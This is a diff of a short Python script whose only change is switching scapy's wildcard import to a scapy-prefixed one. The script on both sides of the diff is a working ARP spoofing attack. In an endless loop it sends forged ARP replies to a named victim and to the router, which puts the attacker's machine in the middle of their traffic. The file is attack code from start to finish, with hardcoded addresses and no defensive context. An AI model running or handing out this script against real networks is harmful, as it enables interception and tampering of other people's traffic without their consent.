@@ -1,5 +1,5 @@
 import time
-from scapy.all import *
+import scapy.all as scapy
 
 my_ip = "192.168.1.161"
 my_mac = "e8:9c:25:4c:02:de"
@@ -11,14 +11,14 @@ router_ip = "192.168.1.1"
 router_mac = "20:b0:01:36:b4:a0"
 
 while True:
-    victim_packet = Ether(dst=victim_mac) / ARP(op = 2, psrc = router_ip, pdst = victim_ip, hwdst = victim_mac, hwsrc = my_mac)
+    victim_packet = scapy.Ether(dst=victim_mac) / scapy.ARP(op = 2, psrc = router_ip, pdst = victim_ip, hwdst = victim_mac, hwsrc = my_mac)
     print(victim_packet)
-    sendp(victim_packet)
+    scapy.sendp(victim_packet)
 
     time.sleep(1)
 
-    router_packet = Ether(dst=router_mac) / ARP(op = 2, psrc = victim_ip, pdst = router_ip, hwdst = router_mac, hwsrc = my_mac)
+    router_packet = scapy.Ether(dst=router_mac) / scapy.ARP(op = 2, psrc = victim_ip, pdst = router_ip, hwdst = router_mac, hwsrc = my_mac)
     print(router_packet)
-    sendp(router_packet)
+    scapy.sendp(router_packet)
 
     time.sleep(1)
